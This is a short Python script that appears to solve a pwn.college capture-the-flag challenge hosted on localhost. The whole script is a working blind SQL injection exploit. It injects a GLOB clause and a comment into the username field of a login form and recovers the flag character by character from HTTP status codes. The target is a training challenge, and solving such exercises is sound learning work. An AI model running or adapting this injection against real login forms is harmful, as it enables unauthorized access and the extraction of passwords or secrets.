import requests

URL = "http://challenge.localhost:80"
flag = 'pwn.college{'
key = "0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ{_-.}"
while len(flag) != 57:
	for testChar in key:
		DATA = {"username" : 'admin" AND password GLOB "' + flag + testChar + '*" --', "password" : "pwn_college{}%"}
		response = requests.post(url = URL, data = DATA);
		if response.status_code == 200:
			flag += testChar
			break;
print(flag)
